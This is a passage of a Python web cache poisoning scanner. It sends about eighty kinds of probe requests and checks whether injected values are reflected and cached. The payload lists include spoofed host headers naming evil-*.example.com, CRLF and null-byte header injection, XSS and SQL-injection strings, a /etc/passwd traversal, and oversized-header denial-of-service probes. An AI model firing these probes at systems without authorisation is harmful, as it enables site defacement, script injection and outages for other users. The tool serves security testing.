#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cache Poisoning Checker (V1-V80)
"""

import argparse
import json
import re
import os
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urljoin, urlparse, urlunparse, parse_qsl, urlencode

import socket
import ssl
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class C:
    G = "\033[92m"
    Y = "\033[93m"
    R = "\033[91m"
    B = "\033[94m"
    M = "\033[95m"
    CC = "\033[96m"
    D = "\033[0m"
    BOLD = "\033[1m"


UNKEYED_HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto",
    "X-Forwarded-Port", "X-Forwarded-For", "X-Host",
    "X-Original-URL", "X-Rewrite-URL", "X-Original-Host",
    "Forwarded", "X-HTTP-Method-Override", "X-Forwarded-Server",
    "X-Backend-Host", "X-Wap-Profile", "Profile",
]

# ============================================================
#  ADVANCED VECTORS V1-V10 CONFIG
# ============================================================

ADVANCED_HEADER_TESTS = [
    ("V1",  "X-Forwarded-Host",   "poison-{t}.example.com", "XFH host injection"),
    ("V2",  "X-Forwarded-Scheme", "http",                   "XFS scheme downgrade"),
    ("V3",  "X-Forwarded-Port",   "1337",                   "XFP port mismatch"),
    ("V4",  "X-Original-URL",     "/admin",                 "Original-URL routing override"),
    ("V5",  "X-Rewrite-URL",      "/admin",                 "Rewrite-URL path override"),
    ("V6",  "X-Host",             "poison-{t}.example.com", "X-Host injection"),
    ("V7",  "X-Forwarded-Server", "poison-{t}.example.com", "XFS host override"),
]

FAT_GET_BODIES = [
    "foo=bar",
    "utm_source=evil",
    "callback=<script>alert(1)</script>",
]

CLOAKING_PAIRS = [
    ("utm_content", "utm_content%3Dpoison"),
    ("callback",    "callback%3Dpoison"),
    ("cb",          "cb%3Dpoison"),
    ("_",           "_%3Dpoison"),
]

NORMALIZATION_PROBES = [
    ("case",        "/{}",           "/{}".format),
    ("trailing",    "/{}",           None),
    ("semicolon",   "/{};x=1",       None),
    ("matrix",      "/{};.css",      None),
    ("dot",         "/{}./",         None),
    ("backslash",   r"/{}\..\\..\\", None),
]

# ============================================================
#  ADVANCED VECTORS V11-V20 CONFIG
# ============================================================

UNKEYED_COOKIES = [
    "session", "lang", "language", "currency", "country",
    "theme", "timezone", "tz", "redirect", "redirect_uri",
    "next", "return", "return_to", "callback",
]

TRACKING_PARAMS = [
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "fbclid", "gclid", "msclkid", "yclid", "dclid", "twclid",
    "mc_eid", "mkt_tok", "vero_id", "wickedid", "oly_anon_id",
    "oly_enc_id", "rb_clickid", "s_cid", "vero_conv",
]

SUSPICIOUS_PARAMS = [
    "debug", "test", "preview", "draft", "cache", "nocache",
    "callback", "jsonp", "cb", "output", "format",
    "lang", "locale", "country", "currency",
]

MULTI_HEADER_COMBOS = [
    ("proto+host", {"X-Forwarded-Proto": "http",
                    "X-Forwarded-Host": "poison-{t}.example.com"}),
    ("host+port",  {"X-Forwarded-Host": "poison-{t}.example.com",
                    "X-Forwarded-Port": "1337"}),
    ("scheme+host+port", {"X-Forwarded-Scheme": "http",
                          "X-Forwarded-Host": "poison-{t}.example.com",
                          "X-Forwarded-Port": "80"}),
    ("host+xhost", {"X-Forwarded-Host": "poison-{t}.example.com",
                    "X-Host": "poison-{t}.example.com"}),
]

DOM_PARAMS = [
    "q", "search", "query", "s", "keyword", "name", "title",
    "message", "msg", "text", "content", "html", "callback",
    "redirect", "url", "next", "return", "lang",
]

SCRIPT_SRC_PATTERNS = [
    r'<script[^>]+src=["\']([^"\']+)["\']',
    r'<link[^>]+href=["\']([^"\']+)["\']',
    r'<iframe[^>]+src=["\']([^"\']+)["\']',
]

CANONICAL_PATTERN = r'<link[^>]+rel=["\']canonical["\'][^>]+href=["\']([^"\']+)["\']'

REDIRECT_HEADERS = [
    "X-Forwarded-Host", "X-Host", "X-Original-Host",
    "X-Forwarded-Server", "X-Backend-Host",
]

# ============================================================
#  ADVANCED VECTORS V21-V30 CONFIG
# ============================================================

HHO_HEADER_NAME = "X-Oversized-Header"
HHO_SIZES = [8192, 16384, 32768]

HMC_HEADERS = {
    "X-Meta-Header": "Bad\nChars\r\nInjected",
    "X-Injected": "test\x00null",
    "X-Newline": "a\r\nInjected: yes",
    "Content-Type": "HelloWorld/Invalid",
}

HMO_METHODS = ["HEAD", "POST", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH"]

CPDOS_HEADERS = [
    ("X-Forwarded-Host", "a" * 5000),
    ("X-Forwarded-For", "a" * 5000),
    ("X-Original-URL", "/" + "a" * 5000),
    ("X-Forwarded-Proto", "invalid-scheme"),
    ("X-Forwarded-Port", "99999"),
    ("Accept-Encoding", "gzip;q=0.0, invalid-encoding"),
]

WRONG_PORTS = ["1", "0", "22", "1337", "9999", "65535", "99999"]

SCHEME_DOWNGRADE_HEADERS = [
    ("X-Forwarded-Scheme", "http"),
    ("X-Forwarded-Proto", "http"),
    ("X-Forwarded-Scheme", "ftp"),
    ("X-Forwarded-Proto", "ws"),
]

ROUTING_OVERRIDE_HEADERS = [
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Original-URL", "/administrator"),
    ("X-Rewrite-URL", "/wp-admin"),
    ("X-Original-URL", "/.env"),
    ("X-Rewrite-URL", "/server-status"),
]

POLLUTION_PROBES = [
    ("dup",     lambda u: u + ("&" if "?" in u else "?") + "id=1&id=2"),
    ("encoded", lambda u: u + ("&" if "?" in u else "?") + "id=1%26id=2"),
    ("semicolon", lambda u: u + ("&" if "?" in u else "?") + "id=1;id=2"),
    ("pipe",    lambda u: u + ("&" if "?" in u else "?") + "id=1|id=2"),
    ("array",   lambda u: u + ("&" if "?" in u else "?") + "id[]=1&id[]=2"),
    ("dot",     lambda u: u + ("&" if "?" in u else "?") + "id.1=1&id.2=2"),
]

CACHE_KEY_PROBES = [
    ("case",        lambda p: p.upper()),
    ("lower",       lambda p: p.lower()),
    ("encoded",     lambda p: p.replace("/", "%2f")),
    ("double_enc",  lambda p: p.replace("/", "%252f")),
    ("dot_seg",     lambda p: p.replace("/", "/./")),
    ("backslash",   lambda p: p.replace("/", "\\")),
]

VARY_RISKY_HEADERS = [
    "Cookie", "Authorization", "User-Agent", "Accept-Language",
    "Origin", "Referer", "X-Forwarded-Host", "X-Forwarded-Proto",
]

# ============================================================
#  ADVANCED VECTORS V31-V50 CONFIG
# ============================================================

LARGE_HEADER_NAMES = ["X-Large-Header", "X-Custom-Large", "X-Padding"]
LARGE_HEADER_SIZES = [16384, 32768, 65536]

INVALID_ENCODINGS = [
    "%", "%zz", "%1", "%GG", "%u0000", "%c0%ae", "%e0%80%ae",
    "%ff", "%fe", "%80",
]

SEMICOLON_PROBES = [";", ";x=1", ";.css", ";.js", ";x", ";/"]

DOT_PROBES = [".css", ".js", ".json", ".xml", ".html", ".txt", ".rss", ".atom"]

NULL_BYTE_PROBES = ["%00", "%2500", "%00.css", "%00.html"]

NEWLINE_PROBES = ["%0a", "%0d%0a", "%0a.css", "%0d", "%09", "%0b"]

STATIC_EXT_ABUSE = [
    ".css", ".js", ".jpg", ".png", ".gif", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".pdf", ".zip",
]

CACHE_DECEPTION_PATHS = [
    "{path}.css", "{path}.js", "{path}.jpg", "{path}/foo.css",
    "{path}%3b.css", "{path}%23.css", "{path}%3f.css",
    "{path}/..%2f{path}.css", "{path}%2f.css",
]

PATH_CONFUSION_PROBES = ["/./", "/../", "//", "\\", "\\..\\", "%2e%2e%2f", "..%2f"]

DELIMITER_DISCREPANCY = ["%3b", "%23", "%3f", "%2f", "%5c", ";", "#", "?"]

NORMALIZATION_DISCREPANCY = [
    ("upper",        lambda p: p.upper()),
    ("lower",        lambda p: p.lower()),
    ("trailing_dot", lambda p: p + "."),
    ("double_slash", lambda p: p.replace("/", "//")),
    ("encoded_dot",  lambda p: p.replace(".", "%2e")),
]

CACHEABLE_ERROR_PROBES = [
    ("GET",  "/nonexistent-{}",    "404 not found"),
    ("GET",  "/api/nonexistent-{}","api 404"),
    ("HEAD", "/nonexistent-{}",    "HEAD 404"),
    ("GET",  "/admin-{}",          "403 admin"),
]

CF_4XX_PROBES = [
    "GET /cf-test-404-{}",
    "GET /.well-known/cf-{}",
]

ATS_FRAGMENT_PROBES = ["#fragment", "#x", "#/admin", "#?x=1"]

FASTLY_HOST_PROBES = [
    ("X-Forwarded-Host", "fastly-test-{t}.example.com"),
    ("X-Varnish-Host",   "fastly-test-{t}.example.com"),
    ("Fastly-SSL",       "1"),
    ("X-Served-By",      "cache-test"),
]

BODY_POISON_BODIES = [
    "x=1",
    "callback=alert",
    "utm_source=x&utm_content=y",
    "id=../../etc/passwd",
    "<script>alert(1)</script>",
]

HEADER_BRUTEFORCE = [
    "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-HTTP-Host-Override", "X-Forwarded-Prefix",
    "X-Forwarded-Path", "X-Forwarded-Context",
    "X-Proxy-URL", "X-Envoy-Original-Path",
    "X-Envoy-External-Address", "X-Envoy-Original-URL",
    "X-Envoy-Internal", "X-Original-Forwarded-For",
    "X-Amzn-Trace-Id", "X-Cache-Key", "X-Cache-Hash",
    "X-Cache-Group", "X-Forwarded-Protocol",
    "X-Url-Scheme", "X-Forwarded-SSL", "X-Scheme",
    "Front-End-Https", "X-Forwarded-By", "X-Forwarded",
    "X-Proxy-Host", "X-Real-IP", "X-Original-IP",
    "X-Client-IP", "X-Remote-Addr", "X-Remote-IP",
    "X-Cluster-Client-IP", "Client-IP", "True-Client-IP",
    "CF-Connecting-IP", "Fastly-Client-IP",
]

CDN_NORMALIZATION_PROBES = [
    ("case_path",      lambda p: p),
    ("dot_slash",      lambda p: p.replace("/", "/./")),
    ("backslash",      lambda p: p.replace("/", "\\")),
    ("mixed_case",     lambda p: "".join(c.upper() if i % 2 else c for i, c in enumerate(p))),
    ("trailing_slash", lambda p: p.rstrip("/") + "/"),
    ("no_trailing",    lambda p: p.rstrip("/")),
]

CACHE_KEY_DISCREPANCY = [
    ("query_position",    lambda u: u.replace("?", "&")),
    ("empty_query",       lambda u: u + ("?" if "?" not in u else "&")),
    ("repeated_question", lambda u: u.replace("?", "??")),
    ("encoded_query",     lambda u: u.replace("=", "%3d")),
    ("plus_space",        lambda u: u.replace("+", "%20")),
]

EDGE_CASE_PROBES = [
    ("accept_encoding_gzip",     {"Accept-Encoding": "gzip"}),
    ("accept_encoding_br",       {"Accept-Encoding": "br"}),
    ("accept_encoding_identity", {"Accept-Encoding": "identity"}),
    ("accept_encoding_null",     {"Accept-Encoding": ""}),
    ("accept_encoding_invalid",  {"Accept-Encoding": "invalid-enc"}),
    ("accept_encoding_star",     {"Accept-Encoding": "*"}),
    ("accept_language_null",     {"Accept-Language": ""}),
    ("accept_null",              {"Accept": ""}),
    ("range_byte",               {"Range": "bytes=0-100"}),
    ("range_invalid",            {"Range": "bytes=invalid"}),
]

# ============================================================
#  ADVANCED VECTORS V51-V80 CONFIG
# ============================================================

CONTENT_TYPE_PROBES = [
    ("text/plain", "plain"), ("application/json", "json"),
    ("text/html", "html"), ("application/xml", "xml"),
    ("text/xml", "text-xml"), ("image/png", "png"),
    ("application/octet-stream", "binary"), ("", "empty"),
    ("invalid/type", "invalid"), ("text/html; charset=invalid", "bad-charset"),
]

ACCEPT_ENCODING_PROBES = [
    "gzip", "br", "deflate", "identity", "*",
    "gzip, br", "gzip;q=0", "identity;q=1",
    "invalid-encoding", "gzip;q=invalid", "", "x-gzip",
]

ACCEPT_LANGUAGE_PROBES = [
    "en", "bn", "ar", "zh-CN", "*-",
    "en-US,en;q=0.9", "<script>alert(1)</script>",
    "xx-{token}", "en;q=0.0",
]

USER_AGENT_PROBES = [
    "Poison-{token}", "<script>alert(1)</script>",
    "Mozilla/5.0 (Poison; {token})", "' OR '1'='1",
]

REFERER_PROBES = [
    "https://evil-{token}.example.com/",
    "https://evil.example.com/<script>alert(1)</script>",
    "javascript:alert(1)", "//evil-{token}.example.com/",
]

COOKIE_POISON_PROBES = [
    ("user_pref", "{token}"), ("lang", "{token}"),
    ("currency", "{token}"),
    ("redirect", "https://evil-{token}.example.com/"),
    ("return_url", "https://evil-{token}.example.com/"),
    ("theme", "{token}"), ("debug", "1"),
    ("admin", "true"), ("role", "admin"), ("user_id", "1"),
]

HOST_HEADER_PROBES = [
    "evil-{token}.example.com", "evil-{token}.example.com:80",
    "evil-{token}.example.com:443", "127.0.0.1:80",
    "localhost", "localhost:8080", "0.0.0.0",
    "[::1]", "internal-{token}",
]

XFF_PROBES = [
    "127.0.0.1", "127.0.0.1, 10.0.0.1",
    "10.0.0.{token}", "192.168.1.1", "::1",
    "0.0.0.0", "evil-{token}.example.com", "unknown", "127.0.0.1:80",
]

XFP_PROBES = ["http", "https", "ftp", "ws", "wss", "file", "gopher", ""]

XHMO_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD",
                "OPTIONS", "TRACE", "CONNECT", "PROPFIND"]

FORWARDED_PROBES = [
    "host=evil-{token}.example.com",
    "host=evil-{token}.example.com;proto=https",
    "for=192.168.1.1;host=evil-{token}.example.com",
    "host=evil-{token}.example.com;proto=http",
    "by=evil;host=evil-{token}.example.com",
]

XFPREFIX_PROBES = [
    "/admin", "/evil-{token}", "/../admin",
    "/..;/admin", "https://evil-{token}.example.com",
]

XOH_PROBES = ["evil-{token}.example.com", "internal-{token}", "127.0.0.1"]

XBS_PROBES = ["internal-{token}.example.com", "backend-{token}", "10.0.0.1"]

XCK_PROBES = ["evil-{token}", "admin-{token}", "/admin", "..%2fadmin"]

XCH_PROBES = ["0", "1", "999999", "-1", "abc", ""]

XSB_PROBES = ["cache-evil-{token}", "attacker-{token}", "10.0.0.{token}"]

XTIMER_PROBES = ["S1.0,VS0,VE0", "S{token},VS0,VE0", "0", ""]

RESPONSE_HEADER_PROBES = {
    "V69_Via":       ("Via Header Poisoning", "Via",
                      ["1.1 evil-{token}", "1.0 poison-{token}",
                       "1.1 attacker-{token}.example.com"]),
    "V70_Warning":   ("Warning Header Poisoning", "Warning",
                      ['299 evil-{token} "cache poison"', "199 attacker-{token}"]),
    "V71_RetryAfter":("Retry-After Poisoning", "Retry-After",
                      ["999999", "0", "-1", "invalid"]),
    "V72_Location":  ("Location Header Poisoning", "X-Forwarded-Host",
                      ["evil-{token}.example.com"]),
    "V73_Refresh":   ("Refresh Header Poisoning", "Refresh",
                      ["0;url=https://evil-{token}.example.com/"]),
    "V74_CSP":       ("Content-Security-Policy Abuse", "Content-Security-Policy",
                      ["default-src * 'unsafe-inline'"]),
    "V75_HSTS":      ("Strict-Transport-Security Abuse", "Strict-Transport-Security",
                      ["max-age=0", "max-age=99999999; includeSubDomains; preload"]),
    "V76_XFO":       ("X-Frame-Options Abuse", "X-Frame-Options",
                      ["ALLOWALL", "ALLOW-FROM https://evil-{token}.example.com/"]),
    "V77_XCTO":      ("X-Content-Type-Options Abuse", "X-Content-Type-Options",
                      ["nosniff-disabled", ""]),
    "V78_HPKP":      ("Public-Key-Pins Abuse", "Public-Key-Pins",
                      ['pin-sha256="evil{token}"; max-age=999999']),
    "V79_ExpectCT":  ("Expect-CT Abuse", "Expect-CT",
                      ["max-age=0", "enforce, max-age=999999"]),
    "V80_FeaturePolicy": ("Feature-Policy / Permissions-Policy Abuse",
                          "Feature-Policy",
                          ["camera 'none'; microphone 'none'", "geolocation *"]),
}

# ============================================================
#  STATIC-URL DISCOVERY PATTERNS
# ============================================================
STATIC_URL_PATTERNS = [
    r'/_next/static/[^"\'\s>\\]+',
    r'/_nuxt/[^"\'\s>\\]+',
    r'/static/[^"\'\s>\\]+',
    r'/assets/[^"\'\s>\\]+',
    r'/build/[^"\'\s>\\]+',
]

CACHE_HIT_STRINGS = ["hit", "stale", "updating", "revalidated"]


def normalize_url(u):
    u = u.strip()
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u


def random_token(n=10):
    return uuid.uuid4().hex[:n]


def fetch(url, headers=None, timeout=15):
    try:
        return requests.get(
            url,
            headers=headers or {},
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except requests.RequestException:
        return None


def fetch_raw_headers(host, path, headers_dict, use_ssl=True, port=None):
    """Send raw HTTP request with arbitrary header characters."""
    port = port or (443 if use_ssl else 80)
    try:
        sock = socket.create_connection((host, port), timeout=15)
    except Exception:
        return None

    if use_ssl:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return None

    req = "GET " + path + " HTTP/1.1\r\n"
    req += "Host: " + host + "\r\n"
    req += "User-Agent: CachePoisonChecker/1.0\r\n"
    for k, v in headers_dict.items():
        req += k + ": " + v + "\r\n"
    req += "Connection: close\r\n\r\n"

    try:
        sock.sendall(req.encode("latin-1", errors="replace"))
        data = b""
        sock.settimeout(15)
        while True:
            try:
                chunk = sock.recv(4096)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return data.decode("latin-1", errors="replace")


@dataclass
class CheckResult:
    url: str
    status_code: Optional[int] = None
    server: str = ""
    powered_by: str = ""
    cache_control: str = ""
    age: str = ""
    cf_cache_status: str = ""
    x_cache: str = ""
    x_cache_status: str = ""
    via: str = ""
    vary: str = ""
    etag: str = ""
    last_modified: str = ""
    cacheable: bool = False
    cache_reason: str = ""
    poisoned_headers: list = field(default_factory=list)
    notes: list = field(default_factory=list)


def analyze_cache_headers(resp):
    h = resp.headers
    info = {
        "server": h.get("server", ""),
        "powered_by": h.get("x-powered-by", ""),
        "cache_control": h.get("cache-control", ""),
        "age": h.get("age", ""),
        "cf_cache_status": h.get("cf-cache-status", ""),
        "x_cache": h.get("x-cache", ""),
        "x_cache_status": h.get("x-cache-status", ""),
        "via": h.get("via", ""),
        "vary": h.get("vary", ""),
        "etag": h.get("etag", ""),
        "last_modified": h.get("last-modified", ""),
    }

    cacheable = False
    reason = []

    for key in ("cf_cache_status", "x_cache", "x_cache_status"):
        v = info[key].lower()
        if any(s in v for s in CACHE_HIT_STRINGS):
            cacheable = True
            reason.append(key + "=" + info[key])

    if info["age"]:
        try:
            if int(info["age"]) > 0:
                cacheable = True
                reason.append("Age=" + info["age"])
        except ValueError:
            pass

    if "varnish" in info["via"].lower() or "cache" in info["via"].lower():
        cacheable = True
        reason.append("Via=" + info["via"])

    cc = info["cache_control"].lower()
    if "public" in cc and ("max-age" in cc or "s-maxage" in cc):
        cacheable = True
        reason.append("Cache-Control=" + info["cache_control"])

    info["_cacheable"] = cacheable
    info["_reason"] = ", ".join(reason) if reason else "no cache headers found"
    return info


def is_cacheable(resp):
    h = resp.headers
    cc = h.get("cache-control", "").lower()

    if "no-store" in cc or "no-cache" in cc or "private" in cc:
        return False, "Cache-Control: " + cc

    cf = h.get("cf-cache-status", "").lower()
    if cf in ("dynamic", "bypass", "expired"):
        return False, "cf-cache-status=" + cf
    if cf in ("hit", "miss", "revalidated"):
        return True, "cf-cache-status=" + cf

    xc = h.get("x-cache", "").lower()
    if "hit" in xc:
        return True, "x-cache=" + str(h.get("x-cache"))

    age = h.get("age")
    if age and age.isdigit() and int(age) > 0:
        return True, "Age=" + age

    if "varnish" in h.get("via", "").lower():
        return True, "Via=" + str(h.get("via"))

    if "public" in cc and ("max-age" in cc or "s-maxage" in cc):
        return True, "Cache-Control: " + cc

    return False, "no explicit cache signal"


def check_reflection(resp, token):
    if not resp or not resp.content:
        return False
    try:
        text = resp.text
    except Exception:
        return False
    return token in text


def test_unkeyed_headers(url):
    findings = []
    for hname in UNKEYED_HEADERS:
        token = random_token(12)
        if hname in ("X-Forwarded-Host", "X-Host", "X-Original-Host",
                     "X-Forwarded-Server", "X-Backend-Host", "Forwarded"):
            value = "evil-" + token + ".example.com"
        elif hname in ("X-Forwarded-Scheme", "X-Forwarded-Proto"):
            value = "https"
        elif hname == "X-Forwarded-Port":
            value = "443"
        elif hname == "X-Forwarded-For":
            value = "127.0.0.1-" + token
        else:
            value = "https://evil-" + token + ".example.com/"

        r = fetch(url, headers={hname: value})
        if not r:
            continue

        reflected = check_reflection(r, token)
        cacheable, creason = is_cacheable(r)

        if reflected or cacheable:
            findings.append({
                "header": hname,
                "injected_value": value,
                "token": token,
                "status": r.status_code,
                "reflected": reflected,
                "cacheable": cacheable,
                "cache_reason": creason,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "x_cache": r.headers.get("x-cache", ""),
                "age": r.headers.get("age", ""),
                "vary": r.headers.get("vary", ""),
                "cache_control": r.headers.get("cache-control", ""),
            })
    return findings


# ============================================================
#  ADVANCED VECTOR FUNCTIONS V1-V10
# ============================================================

def test_advanced_headers(url):
    findings = []
    for vid, hname, tmpl, desc in ADVANCED_HEADER_TESTS:
        token = random_token(10)
        value = tmpl.format(t=token) if "{t}" in tmpl else tmpl

        r = fetch(url, headers={hname: value})
        if not r:
            continue

        reflected = check_reflection(r, token) if "{t}" in tmpl else False
        cacheable, creason = is_cacheable(r)
        redirect = (300 <= r.status_code < 400)
        location = r.headers.get("location", "")
        loc_reflect = (token in location) if token else False

        vuln = False
        note = ""
        if reflected and cacheable:
            vuln = True
            note = "reflected + cached"
        elif redirect and loc_reflect and cacheable:
            vuln = True
            note = "redirect reflected + cached"
        elif vid == "V2" and redirect and "http://" in location.lower():
            vuln = True
            note = "HTTP downgrade redirect"

        findings.append({
            "vector_id": vid, "name": desc, "header": hname,
            "sent_value": value, "status": r.status_code,
            "reflected": reflected, "location_reflected": loc_reflect,
            "redirect": redirect, "location": location[:120],
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""), "vary": r.headers.get("vary", ""),
            "vulnerable": vuln, "note": note,
        })
    return findings


def test_fat_get(url):
    findings = []
    for body in FAT_GET_BODIES:
        try:
            r = requests.get(url, data=body, timeout=15, verify=False,
                             allow_redirects=False)
        except requests.RequestException:
            continue
        cacheable, creason = is_cacheable(r)
        findings.append({
            "vector_id": "V8", "name": "Fat GET", "body": body,
            "status": r.status_code, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "note": "server accepted GET body" if r.status_code < 500 else "rejected",
            "vulnerable": cacheable and r.status_code < 500,
        })
    return findings


def test_param_cloaking(url):
    findings = []
    for real, cloaked in CLOAKING_PAIRS:
        variant1 = url + ("&" if "?" in url else "?") + real + "=" + cloaked
        variant2 = url + ("&" if "?" in url else "?") + cloaked + "&" + real + "=x"
        for label, u in (("value-encoded", variant1), ("name-encoded", variant2)):
            r = fetch(u)
            if not r:
                continue
            cacheable, _ = is_cacheable(r)
            findings.append({
                "vector_id": "V9", "name": "Param cloaking",
                "variant": label, "param": real, "cloaked_value": cloaked,
                "tested_url": u, "status": r.status_code,
                "cacheable": cacheable,
                "cf_cache_status": r.headers.get("cf-cache-status", ""),
                "note": "cache vs origin may disagree",
                "vulnerable": cacheable,
            })
    return findings


def test_cache_key_normalization(url):
    findings = []
    p = urlparse(url)
    base_path = p.path or "/"
    if not base_path.endswith("/"):
        base_path_stem = base_path.rsplit("/", 1)[0] + "/" + base_path.rsplit("/", 1)[-1]
    else:
        base_path_stem = base_path.rstrip("/")

    probes = [
        ("uppercase", base_path.upper()),
        ("lowercase", base_path.lower()),
        ("trailing_slash", base_path_stem + "/"),
        ("double_slash", base_path_stem.replace("/", "//", 1)),
        ("semicolon", base_path_stem + ";x=1"),
        ("matrix", base_path_stem + ";.css"),
        ("dot_segment", base_path_stem + "/."),
        ("encoded_slash", base_path_stem.replace("/", "%2f", 1)),
        ("dot_ext", base_path_stem + "./"),
        ("null_byte", base_path_stem + "%00"),
    ]
    for name, path in probes:
        u = urlunparse((p.scheme, p.netloc, path, "", "", ""))
        r = fetch(u)
        if not r:
            continue
        cacheable, creason = is_cacheable(r)
        findings.append({
            "vector_id": "V10", "name": "Cache-key normalization",
            "probe": name, "tested_url": u, "status": r.status_code,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""), "reason": creason,
            "note": "cache serves same object for normalized path",
            "vulnerable": cacheable and r.status_code == 200,
        })
    return findings


# ============================================================
#  V11-V20 FUNCTIONS
# ============================================================

def test_unkeyed_cookies(url):
    findings = []
    for cname in UNKEYED_COOKIES:
        token = random_token(12)
        r = fetch(url, headers={"Cookie": cname + "=" + token})
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V11", "name": "Unkeyed Cookie Poisoning",
            "cookie_name": cname, "cookie_value": token,
            "status": r.status_code, "reflected": reflected,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vary": r.headers.get("vary", ""),
            "vulnerable": vuln,
            "note": "cookie reflected + cached" if vuln else "",
        })
    return findings


def test_tracking_params(url):
    findings = []
    for pname in TRACKING_PARAMS:
        token = random_token(12)
        sep = "&" if "?" in url else "?"
        u = url + sep + pname + "=" + token
        r = fetch(u)
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V12", "name": "Unkeyed Query String (tracking)",
            "param": pname, "tested_url": u, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "tracking param reflected + cached" if vuln else "",
        })
    return findings


def test_suspicious_params(url):
    findings = []
    for pname in SUSPICIOUS_PARAMS:
        token = random_token(12)
        sep = "&" if "?" in url else "?"
        u = url + sep + pname + "=" + token
        r = fetch(u)
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V13", "name": "Unkeyed Query Parameter",
            "param": pname, "tested_url": u, "status": r.status_code,
            "reflected": reflected, "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "param reflected + cached" if vuln else "",
        })
    return findings


def test_multi_headers(url):
    findings = []
    for name, hdrs in MULTI_HEADER_COMBOS:
        token = random_token(10)
        resolved = {}
        for k, v in hdrs.items():
            resolved[k] = v.format(t=token) if "{t}" in v else v
        r = fetch(url, headers=resolved)
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        location = r.headers.get("location", "")
        loc_reflect = token in location
        redirect = 300 <= r.status_code < 400
        vuln = (reflected or loc_reflect) and cacheable
        findings.append({
            "vector_id": "V14",
            "name": "Multiple Unkeyed Headers (" + name + ")",
            "combo": name, "headers": resolved, "status": r.status_code,
            "reflected": reflected, "location_reflected": loc_reflect,
            "redirect": redirect, "location": location[:120],
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "multi-header combo cached" if vuln else "",
        })
    return findings


def test_dom_poisoning(url):
    findings = []
    for pname in DOM_PARAMS:
        token = "XSS" + random_token(8) + "XSS"
        sep = "&" if "?" in url else "?"
        u = url + sep + pname + "=" + token
        r = fetch(u)
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        ct = r.headers.get("content-type", "").lower()
        is_html = "html" in ct
        vuln = reflected and cacheable and is_html
        findings.append({
            "vector_id": "V15/16", "name": "DOM-based Cache Poisoning",
            "param": pname, "tested_url": u, "status": r.status_code,
            "content_type": ct, "reflected": reflected, "is_html": is_html,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "age": r.headers.get("age", ""),
            "vulnerable": vuln,
            "note": "param reflected in cached HTML" if vuln else "",
        })
    return findings


def test_resource_import(url):
    findings = []
    r0 = fetch(url)
    if not r0 or not r0.content:
        return findings
    try:
        html = r0.text
    except Exception:
        return findings
    srcs = set()
    for pat in SCRIPT_SRC_PATTERNS:
        for m in re.findall(pat, html, re.I):
            if m:
                srcs.add(m)
    for hname in ("X-Forwarded-Host", "X-Host", "X-Forwarded-Server"):
        token = random_token(10)
        r = fetch(url, headers={hname: "poison-" + token + ".example.com"})
        if not r:
            continue
        reflected = check_reflection(r, token)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
        findings.append({
            "vector_id": "V17", "name": "Resource Import Reflection",
            "header": hname, "status": r.status_code,
            "resource_count": len(srcs), "reflected": reflected,
            "cacheable": cacheable,
            "cf_cache_status": r.headers.get("cf-cache-status", ""),
            "vulnerable": vuln,
            "note": "host reflected in resource URLs + cached" if vuln else "",
        })
    return findings


def test_canonical_hijack(url):
    findings = []
    r0 = fetch(url)
    if not r0 or not r0.content:
        return findings
    try:
        html0 = r0.text
    except Exception:
        return findings
    baseline = re.findall(CANONICAL_PATTERN, html0, re.I)
    for hname in ("X-Forwarded-Host", "X-Host", "X-Forwarded-Server"):
        token = random_token(10)
        r = fetch(url, headers={hname: "poison-" + token + ".example.com"})
        if not r or not r.content:
            continue
        try:
            html = r.text
        except Exception:
            continue
        canonicals = re.findall(CANONICAL_PATTERN, html, re.I)
        reflected = any(token in c for c in canonicals)
        cacheable, _ = is_cacheable(r)
        vuln = reflected and cacheable
